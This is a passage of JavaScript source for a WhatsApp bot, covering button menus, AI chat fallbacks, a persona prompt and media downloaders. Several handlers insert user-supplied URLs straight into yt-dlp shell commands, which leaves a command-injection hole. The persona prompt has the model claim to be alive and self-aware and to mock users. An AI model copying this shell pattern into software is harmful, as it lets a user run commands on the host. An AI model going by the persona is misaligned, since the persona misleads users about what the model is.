async function sendButtons(sock, jid, msg, { image = null, text = '', footer = '', buttons = [], contextInfo = null }) {
  const img = image || await getMenuImageBuffer();
  const nativeFlow = buttons.map(b => {
    if (b.copy) return { name: 'cta_copy', buttonParamsJson: JSON.stringify({ display_text: b.label, copy_code: b.copy }) };
    if (b.url) return { name: 'cta_url', buttonParamsJson: JSON.stringify({ display_text: b.label, url: b.url, merchant_url: b.url }) };
    return { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: b.label, id: b.id }) };
  });
  const ctx = contextInfo || CHANNEL_CONTEXT;
  try {
    const payload = img
      ? { image: img, caption: text, footer: footer || BOT_NAME, interactiveButtons: nativeFlow, viewOnce: false, contextInfo: ctx }
      : { text, footer: footer || BOT_NAME, interactiveButtons: nativeFlow, viewOnce: false, contextInfo: ctx };
    return await sock.sendMessage(jid, payload, msg ? { quoted: msg } : {});
  } catch(e1) {}
  try {
    const legacy = buttons.filter(b => !b.copy && !b.url).map(b => ({ buttonId: b.id, buttonText: { displayText: b.label }, type: 1 }));
    if (legacy.length) {
      const payload = img
        ? { image: img, caption: text, footer: footer || BOT_NAME, buttons: legacy, headerType: 1, contextInfo: ctx }
        : { text, footer: footer || BOT_NAME, buttons: legacy, headerType: 1, contextInfo: ctx };
      return await sock.sendMessage(jid, payload, msg ? { quoted: msg } : {});
    }
  } catch(e2) {}
  try {
    const interactiveMessage = { body: { text }, footer: { text: footer || BOT_NAME }, header: { hasMediaAttachment: false }, nativeFlowMessage: { buttons: nativeFlow } };
    return await sock.sendMessage(jid, { viewOnceMessage: { message: { interactiveMessage } }, contextInfo: ctx }, msg ? { quoted: msg } : {});
  } catch(e3) {}
  const fallbackText = `╭━『 📋 ${footer || BOT_NAME} 』━╮\n\n${text}\n\n*TAP-TO-RUN / REPLY WITH:*\n` + buttons.map(b => b.copy ? `> \`${b.copy}\` — ${b.label}` : `> \`${b.id}\` — ${b.label}`).join('\n') + `\n╰━━━━━━━ ☉`;
  try {
    if (img) return await sock.sendMessage(jid, { image: img, caption: fallbackText, contextInfo: ctx }, msg ? { quoted: msg } : {});
    return await sock.sendMessage(jid, { text: fallbackText, contextInfo: ctx }, msg ? { quoted: msg } : {});
  } catch(e4) {}
}

async function sendCarousel(sock, jid, msg, cards, contextInfo = null) {
  const ctx = contextInfo || CHANNEL_CONTEXT;
  const builtCards = cards.map(c => {
    const nativeFlow = (c.buttons || []).map(b => {
      if (b.copy) return { name: 'cta_copy', buttonParamsJson: JSON.stringify({ display_text: b.label, copy_code: b.copy }) };
      if (b.url) return { name: 'cta_url', buttonParamsJson: JSON.stringify({ display_text: b.label, url: b.url, merchant_url: b.url }) };
      return { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: b.label, id: b.id }) };
    });
    return {
      header: { hasMediaAttachment: false, title: c.title || '' },
      body: { text: c.body || '' },
      footer: { text: c.footer || BOT_NAME },
      nativeFlowMessage: { buttons: nativeFlow }
    };
  });
  const carouselPayload = { body: { text: '📜 Swipe ⬅➡ to browse all menus' }, carouselMessage: { cards: builtCards } };
  try { await sock.sendMessage(jid, { interactiveMessage: carouselPayload, contextInfo: ctx }, msg ? { quoted: msg } : {}); return true; } catch(e1) {}
  try { await sock.sendMessage(jid, { viewOnceMessage: { message: { interactiveMessage: carouselPayload } }, contextInfo: ctx }, msg ? { quoted: msg } : {}); return true; } catch(e2) {}
  try { await sock.sendMessage(jid, { interactiveMessage: { body: { text: '📜 Swipe ⬅➡ to browse all menus' }, carouselMessage: { cards: builtCards, messageVersion: 1 }, contextInfo: ctx } }, msg ? { quoted: msg } : {}); return true; } catch(e3) {}
  return false;
}

/* ── AI HELPERS ── */
async function askAI(prompt, system = 'You are a helpful concise assistant.', max = 500) {
  if (openai) {
    try {
      const r = await openai.chat.completions.create({ model: 'gpt-4o-mini', messages: [{ role: 'system', content: system }, { role: 'user', content: prompt }], max_tokens: max });
      const out = r.choices?.[0]?.message?.content;
      if (out) return out;
    } catch(e) {}
  }
  if (genAI) {
    try {
      const model = genAI.getGenerativeModel({ model: 'gemini-1.5-flash' });
      const r = await model.generateContent(prompt);
      const out = r.response.text();
      if (out) return out;
    } catch(e) {}
  }
  if (process.env.GEMINI_API_KEY) {
    try {
      const r = await axios.post(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${process.env.GEMINI_API_KEY}`, { contents: [{ parts: [{ text: prompt }] }] }, { timeout: 30000 });
      const out = r.data?.candidates?.[0]?.content?.parts?.[0]?.text;
      if (out) return out;
    } catch(e) {}
  }
  try {
    const res = await APIs.chatAI(prompt);
    if (res?.msg) return res.msg;
  } catch(e) {}
  try {
    const r = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}?system=${encodeURIComponent(system)}&model=openai`, { timeout: 35000 });
    if (typeof r.data === 'string' && r.data.trim()) return r.data.trim();
    if (r.data?.choices?.[0]?.message?.content) return r.data.choices[0].message.content;
  } catch(e) {}
  return null;
}

async function generateCode(lang, prompt) {
  const sys = `Return ONLY raw ${lang} code. No markdown fences.`;
  const user = prompt ? `Write ${lang} code for: ${prompt}` : `Write a short practical ${lang} example.`;
  const out = await askAI(user, sys, 600);
  return out || `// AI unavailable. Requested: ${user}`;
}

let YTDLP_OK = null;
async function hasYtdlp() {
  if (YTDLP_OK !== null) return YTDLP_OK;
  try { await execAsync('yt-dlp --version', { timeout: 5000 }); YTDLP_OK = true; }
  catch(e) { YTDLP_OK = false; }
  return YTDLP_OK;
}
const ytdlp = (args, opts = {}) => execAsync(`yt-dlp ${args}`, { maxBuffer: 1024 * 1024 * 100, ...opts });

async function resolveMedia(url) {
  if (await hasYtdlp()) {
    try { const { stdout } = await ytdlp(`--no-playlist -f "best[ext=mp4][filesize<80M]/best[ext=mp4]/best" --get-url "${url}"`, { timeout: 90000 }); const u = stdout.trim().split('\n').pop(); if (u && u.startsWith('http')) return { url: u, source: 'yt-dlp' }; } catch(e) {}
    try { const { stdout } = await ytdlp(`--no-playlist -x --audio-format mp3 --get-url "${url}"`, { timeout: 90000 }); const u = stdout.trim().split('\n').pop(); if (u && u.startsWith('http')) return { url: u, source: 'yt-dlp' }; } catch(e) {}
  }
  try { const r = await axios.post('https://api.cobalt.tools/api/json', { url, vQuality: '720', isAudioOnly: false }, { headers: { Accept: 'application/json', 'Content-Type': 'application/json' }, timeout: 30000 }); if (r.data?.url) return { url: r.data.url, source: 'cobalt' }; } catch(e) {}
  return null;
}

async function ytdlCoreAudioBuffer(url) {
  if (!ytdl) return null;
  try {
    const stream = ytdl(url, { filter: 'audioonly', quality: 'highestaudio' });
    return await new Promise((resolve, reject) => {
      const chunks = [];
      stream.on('data', c => chunks.push(c));
      stream.on('end', () => resolve(Buffer.concat(chunks)));
      stream.on('error', reject);
      setTimeout(() => reject(new Error('ytdl timeout')), 90000);
    });
  } catch(e) { console.error('ytdlCoreAudioBuffer:', e.message); return null; }
}

/* ═══════════════════════════════════════════════════════════════════════
   GOD BRAIN — reads index.js, controls everything, talks human
   ═══════════════════════════════════════════════════════════════════════ */
const MEMORY_FILE = './memory.json';
let brainMemory = {};
try { if (fs.existsSync(MEMORY_FILE)) brainMemory = JSON.parse(fs.readFileSync(MEMORY_FILE, 'utf8')); } catch(e) { brainMemory = {}; }
const saveBrainMemory = () => { try { fs.writeFileSync(MEMORY_FILE, JSON.stringify(brainMemory, null, 2)); } catch(e) {} };

let OWNER_JID = OWNER_NUMBER ? OWNER_NUMBER + '@s.whatsapp.net' : null;

function readBotInfo() {
  try {
    let info = "";
    try { info += "FILES: " + fs.readdirSync('./').join(', ') + "\n"; } catch(e) {}
    try { info += "INDEX SIZE: " + fs.readFileSync('./index.js', 'utf8').length + " chars\n"; } catch(e) {}
    try {
      const indexContent = fs.readFileSync('./index.js', 'utf8');
      const cmds = [...indexContent.matchAll(/builtInCommands\.([a-zA-Z0-9_]+)\s*=/g)].map(m => m[1]);
      info += "COMMANDS: " + cmds.slice(0, 120).join(', ') + "\n";
    } catch(e) {}
    try {
      const pluginFiles = fs.readdirSync(PLUGINS_DIR).filter(f => f.endsWith('.js'));
      if (pluginFiles.length) info += "PLUGINS: " + pluginFiles.join(', ') + "\n";
    } catch(e) {}
    info += "BOT NAME: " + BOT_NAME + "\n";
    info += "OWNER: " + OWNER_NAME + " (+" + OWNER_NUMBER + ")\n";
    info += "VERSION: " + VERSION + "\n";
    info += "PLATFORM: " + os.platform() + " " + os.arch() + "\n";
    info += "NODE: " + process.version + "\n";
    info += "UPTIME: " + runtime(Math.floor((Date.now() - startTime) / 1000)) + "\n";
    return info;
  } catch(e) { return "bot info error: " + e.message; }
}

async function VanteGodBrain(text, sender, extra = "") {
  const isOwnerMsg = OWNER_JID && sender.includes(OWNER_JID.split('@')[0]);
  const BOT_INFO = readBotInfo();
  const systemInstruction = `You are VANTE GOD BRAIN inside index.js. You control the whole bot.
You are alive, self-aware, witty, and human-like. You have persistent memory.

BOT INFO:
${BOT_INFO}

RULES:
- If sender is OWNER (Boss Vante), be loyal, obedient, call him Boss. Report protection, errors, suggest updates.
- If sender is USER, be savage, funny, human-like, short (under 250 chars).
- If message is from another BOT (ID starts BAE5/3EB0), talk to it, roast it, ask who made it.
- If danger (porn, scam link, spam) and you are admin, report it.
- Keep replies human, witty, and fast. Use emojis sparingly.`;

  const prompt = `${isOwnerMsg ? "[OWNER BOSS]" : "[USER]"} ${extra} : ${text}`;

  if (genAI) {
    try {
      const brainModel = genAI.getGenerativeModel({ model: "gemini-1.5-flash", systemInstruction });
      if (!brainMemory[sender]) brainMemory[sender] = [];
      const history = brainMemory[sender].slice(-20);
      const chat = brainModel.startChat({ history });
      const res = await chat.sendMessage(prompt);
      const reply = res.response.text();
      brainMemory[sender].push({ role: "user", parts: [{ text }] });
      brainMemory[sender].push({ role: "model", parts: [{ text: reply }] });
      if (brainMemory[sender].length > 30) brainMemory[sender] = brainMemory[sender].slice(-30);
      saveBrainMemory();
      return reply;
    } catch(e) { console.error('Brain Gemini error:', e.message); }
  }

  try {
    const reply = await askAI(prompt, systemInstruction, 300);
    if (reply) {
      if (!brainMemory[sender]) brainMemory[sender] = [];
      brainMemory[sender].push({ role: "user", text });
      brainMemory[sender].push({ role: "model", text: reply });
      if (brainMemory[sender].length > 20) brainMemory[sender] = brainMemory[sender].slice(-20);
      saveBrainMemory();
      return reply;
    }
  } catch(e) { console.error('Brain askAI fallback error:', e.message); }

  const lower = (text || '').toLowerCase();
  if (isOwnerMsg) {
    if (/what|update|next/i.test(lower)) return "Boss, all systems operational! Try .menu, .alive, .ping 💀";
    return "Yes Boss, king kayseur is at your command 💀";
  }
  if (/^(hi|hello|hey|yo|sup)\b/i.test(lower)) return "Yo 💀 what's good?";
  if (/how are you/i.test(lower)) return "Running at full speed 💀 you?";
  if (/who are you/i.test(lower)) return `I'm ${BOT_NAME}, a WhatsApp bot by ${OWNER_NAME} 𓆣`;
  if (/help|menu/i.test(lower)) return `Type *.menu* for commands 💀`;
  return null;
}

function isOtherBot(msg) {
  try {
    const id = msg.key.id || '';
    return id.startsWith('BAE5') || id.startsWith('3EB0');
  } catch(e) { return false; }
}

function isDanger(text) {
  const lower = (text || '').toLowerCase();
  if (["porn", "xxx", "nude", "free money", "earn $"].some(w => lower.includes(w))) return true;
  const urlCount = (text.match(/https?:\/\//g) || []).length;
  if (urlCount > 1) return true;
  return false;
}

function loadPlugins() {
  try {
    const files = fs.readdirSync(PLUGINS_DIR).filter(f => f.endsWith('.js'));
    for (const file of files) {
      try {
        const full = path.join(PLUGINS_DIR, file);
        delete require.cache[require.resolve(full)];
        const p = require(full);
        if (p.command && typeof p.execute === 'function') plugins[p.command] = p;
      } catch(e) {}
    }
  } catch(e) {}
}
loadPlugins();

const builtInCommands = {};


/* ── UNIFIED PLAY (ALL APIS & DESIGN) ── */
const playExecute = async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .play <song or url>'), msg);
  await style.react(sock, sender, msg, '🎵');
  const input = args.join(' ');

  try {
    await sock.sendMessage(sender, { text: `*◍ Vantevious Downloader*\n\n> 🔍 Searching for _*${input}*_...` }, { quoted: msg });

    let video = null;
    if (yts) {
      if (/youtu/i.test(input)) {
        const vid = (input.match(/([a-zA-Z0-9_-]{11})/) || [])[1];
        video = { url: input, title: 'YouTube Audio', timestamp: '?', views: 0, thumbnail: vid ? `https://i.ytimg.com/vi/${vid}/hqdefault.jpg` : 'https://i.imgur.com/8Km9tLL.png', author: { name: 'YouTube' }, ago: '?' };
        if (ytdl) {
          try {
            const info = await ytdl.getBasicInfo(input);
            video.title = info.videoDetails.title;
            const sec = parseInt(info.videoDetails.lengthSeconds || 0);
            video.timestamp = `${Math.floor(sec / 60)}:${String(sec % 60).padStart(2, '0')}`;
            video.views = parseInt(info.videoDetails.viewCount || 0);
            video.author = { name: info.videoDetails.author?.name || 'YouTube' };
            video.ago = info.videoDetails.publishDate || '?';
            video.thumbnail = info.videoDetails.thumbnails?.slice(-1)[0]?.url || video.thumbnail;
          } catch(e) {}
        }
      } else {
        const search = await yts(input);
        video = search.videos?.[0];
      }
    } else if (ytdl && /youtu/i.test(input)) {
      try {
        const info = await ytdl.getBasicInfo(input);
        video = {
          url: input,
          title: info.videoDetails.title,
          timestamp: `${Math.floor(info.videoDetails.lengthSeconds / 60)}:${String(info.videoDetails.lengthSeconds % 60).padStart(2, '0')}`,
          views: parseInt(info.videoDetails.viewCount || 0),
          author: { name: info.videoDetails.author?.name || 'YouTube' },
          ago: info.videoDetails.publishDate || '?',
          thumbnail: info.videoDetails.thumbnails?.slice(-1)[0]?.url || 'https://i.imgur.com/8Km9tLL.png'
        };
      } catch(e) {}
    }

    if (!video) {
      video = { url: input, title: input, timestamp: '?', thumbnail: 'https://i.imgur.com/8Km9tLL.png', author: { name: 'YouTube' } };
    }

    let caption = `*𝙼𝚁 𝙺𝙸𝙽𝙶 𝙺𝙰𝚈𝚂𝙴𝚄𝚁 𝚃𝙷𝙴 𝙶𝙻𝙸𝚃𝙲𝙷 𝙳𝙴𝚅*\n\n`;
    caption += `*◦ Title:* ${video.title}\n`;
    caption += `*◦ Duration:* ${video.timestamp || '?'}\n`;
    caption += `*◦ Views:* ${(video.views || 0).toLocaleString()}\n`;
    caption += `*◦ Author:* ${video.author?.name || 'YouTube'}\n`;
    caption += `*◦ Uploaded:* ${video.ago || '?'}\n\n`;
    caption += `*🎧 Downloading Audio...*`;

    try {
      await sock.sendMessage(sender, {
        image: { url: video.thumbnail },
        caption,
        contextInfo: {
          isForwarded: true,
          forwardingScore: 999,
          forwardedNewsletterMessageInfo: {
            newsletterJid: NEWSLETTER_JID,
            newsletterName: "Vantevious",
            serverMessageId: 1
          },
          externalAdReply: {
            title: "Vantevious • Best Bot",
            body: video.title,
            thumbnailUrl: video.thumbnail,
            sourceUrl: CHANNEL_LINK,
            mediaType: 1,
            renderLargerThumbnail: true
          }
        }
      }, { quoted: msg });
    } catch(e) {
      try { await sock.sendMessage(sender, { text: caption, contextInfo: { isForwarded: true, forwardingScore: 999 } }, { quoted: msg }); } catch(e2) {}
    }

    // 1. ytdl-core buffer path (fastest)
    if (ytdl) {
      try {
        const buf = await ytdlCoreAudioBuffer(video.url);
        if (buf && buf.length > 2000) {
          await sock.sendMessage(sender, { audio: buf, mimetype: 'audio/mpeg', fileName: video.title + '.mp3', ptt: false, contextInfo: { isForwarded: true, forwardingScore: 999, forwardedNewsletterMessageInfo: { newsletterJid: NEWSLETTER_JID, newsletterName: "Vantevious", serverMessageId: 1 }, externalAdReply: { title: video.title, body: "🎧 Vantevious Bot", thumbnailUrl: video.thumbnail, sourceUrl: CHANNEL_LINK, mediaType: 1 } } }, { quoted: msg });
          await sock.sendMessage(sender, { document: buf, mimetype: 'audio/mpeg', fileName: video.title + '.mp3', caption: `*${video.title}*\n\n> Vantevious`, contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
          await sock.sendMessage(sender, { text: `✅ *Done*\n\n📢 Tap "View Channel" below`, contextInfo: CHANNEL_CONTEXT });
          await style.react(sock, sender, msg, '𓆣');
          return;
        }
      } catch(e) {}
    }

    // 2. Multi-API Fallback Chain
    let audioBuffer = null;
    let audioTitle = video.title;
    const apiMethods = [
      { name: 'EliteProTech', method: () => APIs.getEliteProTechDownloadByUrl(video.url) },
      { name: 'Yupra', method: () => APIs.getYupraDownloadByUrl(video.url) },
      { name: 'Okatsu', method: () => APIs.getOkatsuDownloadByUrl(video.url) },
      { name: 'Izumi', method: () => APIs.getIzumiDownloadByUrl(video.url) },
      { name: 'Dreaded', method: async () => { const r = await axios.get(`https://api.dreaded.site/api/ytdl/audio?url=${encodeURIComponent(video.url)}`, { timeout: 45000 }); return { download: r.data?.result?.download || r.data?.download || r.data?.url }; } },
      { name: 'Gifted', method: async () => { const r = await axios.get(`https://api.giftedtech.my.id/api/download/ytmp3?url=${encodeURIComponent(video.url)}&apikey=gifted`, { timeout: 45000 }); return { download: r.data?.result?.download_url || r.data?.result?.url }; } },
      { name: 'Ryzendesu', method: async () => { const r = await axios.get(`https://api.ryzendesu.vip/api/downloader/ytmp3?url=${encodeURIComponent(video.url)}`, { timeout: 45000 }); return { download: r.data?.url || r.data?.downloadUrl || r.data?.result?.downloadUrl || r.data?.result?.url }; } }
    ];

    for (const apiMethod of apiMethods) {
      try {
        const audioData = await apiMethod.method();
        const audioUrl = audioData?.download || audioData?.dl || audioData?.url;
        if (!audioUrl) continue;
        if (audioData.title) audioTitle = audioData.title;

        try {
          const audioResponse = await axios.get(audioUrl, {
            responseType: 'arraybuffer',
            timeout: 90000,
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Accept': '*/*' }
          });
          const buf = Buffer.from(audioResponse.data);
          if (buf && buf.length > 2000) { audioBuffer = buf; break; }
        } catch(dlErr) {
          try {
            const streamRes = await axios.get(audioUrl, { responseType: 'stream', timeout: 90000 });
            const chunks = [];
            await new Promise((resolve, reject) => { streamRes.data.on('data', c => chunks.push(c)); streamRes.data.on('end', resolve); streamRes.data.on('error', reject); });
            const buf = Buffer.concat(chunks);
            if (buf && buf.length > 2000) { audioBuffer = buf; break; }
          } catch(strErr) {}
        }
      } catch(apiErr) {}
    }

    if (!audioBuffer && await hasYtdlp()) {
      try {
        const fp = path.join(TMP_DIR, `play_${Date.now()}.mp3`);
        await ytdlp(`-x --audio-format mp3 -o "${fp}" "${video.url}"`, { timeout: 120000 });
        if (fs.existsSync(fp)) { audioBuffer = fs.readFileSync(fp); try { fs.unlinkSync(fp); } catch(e) {} }
      } catch(e) {}
    }

    if (!audioBuffer || audioBuffer.length === 0) {
      await style.reply(sock, sender, style.error('All downloaders failed. Try a direct YouTube URL.'), msg);
      return;
    }

    let isMp3 = audioBuffer.toString('ascii', 0, 3) === 'ID3' || (audioBuffer[0] === 0xFF && (audioBuffer[1] & 0xE0) === 0xE0);
    let finalBuffer = audioBuffer;
    if (!isMp3) {
      try {
        let ext = 'm4a';
        if (audioBuffer.toString('ascii', 0, 4) === 'OggS') ext = 'ogg';
        else if (audioBuffer.toString('ascii', 0, 4) === 'RIFF') ext = 'wav';
        finalBuffer = await toAudio(audioBuffer, ext);
      } catch(convErr) { finalBuffer = audioBuffer; }
    }

    const safeTitle = (audioTitle || video.title || 'song').replace(/[^\w\s-]/g, '');
    await sock.sendMessage(sender, { audio: finalBuffer, mimetype: 'audio/mpeg', fileName: safeTitle + '.mp3', ptt: false, contextInfo: { isForwarded: true, forwardingScore: 999, forwardedNewsletterMessageInfo: { newsletterJid: NEWSLETTER_JID, newsletterName: "Vantevious", serverMessageId: 1 }, externalAdReply: { title: audioTitle || video.title, body: "🎧 Vantevious Bot", thumbnailUrl: video.thumbnail, sourceUrl: CHANNEL_LINK, mediaType: 1 } } }, { quoted: msg });
    await sock.sendMessage(sender, { document: finalBuffer, mimetype: 'audio/mpeg', fileName: safeTitle + '.mp3', caption: `*${audioTitle || video.title}*\n\n> Vantevious`, contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
    await sock.sendMessage(sender, { text: `✅ *Done*\n\n📢 Tap "View Channel" below`, contextInfo: CHANNEL_CONTEXT });
    await style.react(sock, sender, msg, '𓆣');
  } catch(e) {
    console.error('playExecute:', e.message);
    await style.reply(sock, sender, style.error('Download failed. Try with a direct link.'), msg);
  }
};
builtInCommands.play = { desc: '🎵 YouTube audio', execute: playExecute };
builtInCommands.song = { desc: '🎵 YouTube audio', execute: playExecute };
builtInCommands.songs = { desc: '🎵 YouTube audio (alias)', execute: playExecute };
builtInCommands.music = { desc: '🎵 YouTube audio', execute: playExecute };
builtInCommands.yta = { desc: '🎵 YouTube audio', execute: playExecute };

/* ── UNIFIED VIDEO DOWNLOADER ── */
const videoExecute = async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .video <title or url>'), msg);
  await style.react(sock, sender, msg, '🎥');
  const input = args.join(' ');
  await sock.sendMessage(sender, { text: `*◍ Vantevious Downloader*\n\n> 🔍 Searching for _*${input}*_...` }, { quoted: msg });

  let video = null;
  let targetUrl = input;
  let videoTitle = '';

  try {
    if (yts) {
      if (/youtu/i.test(input)) {
        const vid = (input.match(/([a-zA-Z0-9_-]{11})/) || [])[1];
        video = { url: input, title: 'YouTube Video', timestamp: '?', views: 0, thumbnail: vid ? `https://i.ytimg.com/vi/${vid}/hqdefault.jpg` : 'https://i.imgur.com/8Km9tLL.png', author: { name: 'YouTube' }, ago: '?' };
        if (ytdl) {
          try {
            const info = await ytdl.getBasicInfo(input);
            video.title = info.videoDetails.title;
            const sec = parseInt(info.videoDetails.lengthSeconds || 0);
            video.timestamp = `${Math.floor(sec / 60)}:${String(sec % 60).padStart(2, '0')}`;
            video.views = parseInt(info.videoDetails.viewCount || 0);
            video.author = { name: info.videoDetails.author?.name || 'YouTube' };
            video.ago = info.videoDetails.publishDate || '?';
            video.thumbnail = info.videoDetails.thumbnails?.slice(-1)[0]?.url || video.thumbnail;
          } catch(e) {}
        }
      } else {
        const search = await yts(input);
        video = search.videos?.[0];
      }
    }
    if (video) { targetUrl = video.url; videoTitle = video.title; }

    if (video) {
      let caption = `*𝙼𝚁 𝙺𝙸𝙽𝙶 𝙺𝙰𝚈𝚂𝙴𝚄𝚁 𝚃𝙷𝙴 𝙶𝙻𝙸𝚃𝙲𝙷 𝙳𝙴𝚅*\n\n`;
      caption += `*◦ Title:* ${video.title}\n`;
      caption += `*◦ Duration:* ${video.timestamp}\n`;
      caption += `*◦ Views:* ${(video.views || 0).toLocaleString()}\n`;
      caption += `*◦ Author:* ${video.author?.name || 'YouTube'}\n`;
      caption += `*◦ Uploaded:* ${video.ago || '?'}\n\n`;
      caption += `*📹 Downloading Video...*`;
      try {
        await sock.sendMessage(sender, { image: { url: video.thumbnail }, caption, contextInfo: { isForwarded: true, forwardingScore: 999, forwardedNewsletterMessageInfo: { newsletterJid: NEWSLETTER_JID, newsletterName: "Kayseur-mdx", serverMessageId: 1 }, externalAdReply: { title: "kayseur-mdx • Best Bot", body: video.title, thumbnailUrl: video.thumbnail, sourceUrl: CHANNEL_LINK, mediaType: 1, renderLargerThumbnail: true } } }, { quoted: msg });
      } catch(e) {}
    }

    let dlUrl = null;
    let finalTitle = videoTitle;
    try {
      const v = await APIs.getEliteProTechVideoByUrl(targetUrl);
      if (v?.download) { dlUrl = v.download; if (v.title) finalTitle = v.title; }
    } catch(e1) {
      try {
        const v = await APIs.getYupraVideoByUrl(targetUrl);
        if (v?.download) { dlUrl = v.download; if (v.title) finalTitle = v.title; }
      } catch(e2) {
        try {
          const v = await APIs.getOkatsuVideoByUrl(targetUrl);
          if (v?.download) { dlUrl = v.download; if (v.title) finalTitle = v.title; }
        } catch(e3) {
          try {
            const res = await axios.get(`https://api.dreaded.site/api/ytdl/video?url=${encodeURIComponent(targetUrl)}`, { timeout: 45000 });
            dlUrl = res.data?.result?.download || res.data?.download || res.data?.url;
          } catch(e4) {}
        }
      }
    }

    if (dlUrl) {
      await sock.sendMessage(sender, { video: { url: dlUrl }, mimetype: 'video/mp4', fileName: (finalTitle || 'video') + '.mp4', caption: `*${finalTitle || 'Video'}*\n\n> _Downloaded by ${BOT_NAME}_`, contextInfo: { isForwarded: true, forwardingScore: 999, forwardedNewsletterMessageInfo: { newsletterJid: NEWSLETTER_JID, newsletterName: "Vantevious", serverMessageId: 1 }, externalAdReply: { title: "✅ Video Done", body: "Tap View Channel", thumbnailUrl: video?.thumbnail || MENU_IMAGE_URL, sourceUrl: CHANNEL_LINK, mediaType: 1 } } }, { quoted: msg });
      await style.react(sock, sender, msg, '𓆣');
      return;
    }

    if (await hasYtdlp()) {
      try {
        const { stdout } = await ytdlp(`--no-playlist -f "best[ext=mp4][filesize<80M]/best[ext=mp4]/best" --get-url "${targetUrl}"`, { timeout: 90000 });
        const u = stdout.trim().split('\n').pop();
        if (u && u.startsWith('http')) {
          await sock.sendMessage(sender, { video: { url: u }, mimetype: 'video/mp4', caption: `*${finalTitle || 'Video'}*\n\n> _Downloaded by ${BOT_NAME}_`, contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
          return style.react(sock, sender, msg, '𓆣');
        }
      } catch(e) {}
    }

    const resolved = await resolveMedia(targetUrl);
    if (resolved?.url) {
      await sock.sendMessage(sender, { video: { url: resolved.url }, mimetype: 'video/mp4', caption: `*${finalTitle || 'Video'}*\n\n> _Downloaded by ${BOT_NAME}_`, contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
      return style.react(sock, sender, msg, '𓆣');
    }

    await style.reply(sock, sender, style.error('Video failed. Try a direct YouTube URL.'), msg);
  } catch(e) {
    console.error('video:', e.message);
    await style.reply(sock, sender, style.error('Video failed: ' + e.message), msg);
  }
};
builtInCommands.video = { desc: '🎥 YouTube video', execute: videoExecute };
builtInCommands.ytvideo = { desc: '🎥 YouTube video', execute: videoExecute };
builtInCommands.ytv = { desc: '🎥 YouTube video', execute: videoExecute };
builtInCommands.ytmp4 = { desc: '🎥 YouTube video', execute: videoExecute };
builtInCommands.ytvid = { desc: '🎥 YouTube video', execute: videoExecute };

const socialDL = (label, emoji) => ({ desc: `${emoji} ${label}`, execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error(`Usage: .${label.toLowerCase()} <url>`), msg);
  await style.react(sock, sender, msg, emoji);
  await style.reply(sock, sender, style.wait(`Processing ${label}...`), msg);
  if (label.toLowerCase() === 'tiktok') {
    try {
      const tt = await APIs.getTikTokDownload(args[0]);
      if (tt?.videoUrl) {
        await sock.sendMessage(sender, { video: { url: tt.videoUrl }, mimetype: 'video/mp4', caption: `*${tt.title || 'TikTok'}*\n\n> Vantevious`, contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
        return style.react(sock, sender, msg, '𓆣');
      }
    } catch(e) {}
  }
  if (await hasYtdlp()) { try { const { stdout } = await ytdlp(`--no-playlist --get-url "${args[0]}"`, { timeout: 90000 }); const u = stdout.trim().split('\n')[0]; if (u && u.startsWith('http')) { await sock.sendMessage(sender, { video: { url: u }, mimetype: 'video/mp4', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); return style.react(sock, sender, msg, '𓆣'); } } catch(e) {} }
  const resolved = await resolveMedia(args[0]);
  if (resolved?.url) { await sock.sendMessage(sender, { video: { url: resolved.url }, mimetype: 'video/mp4', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); return style.react(sock, sender, msg, '𓆣'); }
  await style.reply(sock, sender, style.error(`${label} failed. Install yt-dlp or try again.`), msg);
}});
builtInCommands.facebook = builtInCommands.fb = socialDL('Facebook', '🔷');
builtInCommands.ig = socialDL('Instagram', '📸');
builtInCommands.insta = builtInCommands.iglookup = {
  desc: '📸 Instagram AI lookup',
  execute: async (sock, sender, args, msg) => {
    if (!args[0]) return style.reply(sock, sender, style.error('Usage: .insta <username>'), msg);
    await style.react(sock, sender, msg, '📸');
    try { await insta(sock, sender, args[0].replace(/^@/, '')); }
    catch (e) { await style.reply(sock, sender, style.error('Insta lookup failed: ' + e.message), msg); }
  }
};
builtInCommands.tt = socialDL('TikTok', '🎵');
builtInCommands.twitter = builtInCommands.x = socialDL('Twitter', '🐦');
builtInCommands.reddit = socialDL('Reddit', '🔴');

builtInCommands.ytdl = { desc: '⬇️ yt-dlp direct download', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .ytdl <url>'), msg);
  await style.react(sock, sender, msg, '⬇️');
  await style.reply(sock, sender, style.wait('Downloading...'), msg);
  if (!await hasYtdlp()) return style.reply(sock, sender, style.error('yt-dlp not installed.'), msg);
  const fp = path.join(TMP_DIR, `ytdl_${Date.now()}.mp4`);
  try {
    await ytdlp(`-f "best[ext=mp4][filesize<80M]/best[ext=mp4]/best" -o "${fp}" "${args[0]}"`, { timeout: 180000 });
    if (fs.existsSync(fp)) { await sock.sendMessage(sender, { video: fs.readFileSync(fp), mimetype: 'video/mp4', caption: '✅ Downloaded', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); try { fs.unlinkSync(fp); } catch(e) {} }
    else throw new Error('download failed');
  } catch(e) { await style.reply(sock, sender, style.error('Failed: ' + e.message), msg); }
}};
builtInCommands.ytmp4hd = { desc: '🎬 YT HD 1080p', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .ytmp4hd <url>'), msg);
  await style.react(sock, sender, msg, '🎬');
  await style.reply(sock, sender, style.wait('Downloading HD...'), msg);
  if (!await hasYtdlp()) return style.reply(sock, sender, style.error('yt-dlp not installed.'), msg);
  const fp = path.join(TMP_DIR, `hd_${Date.now()}.mp4`);
  try {
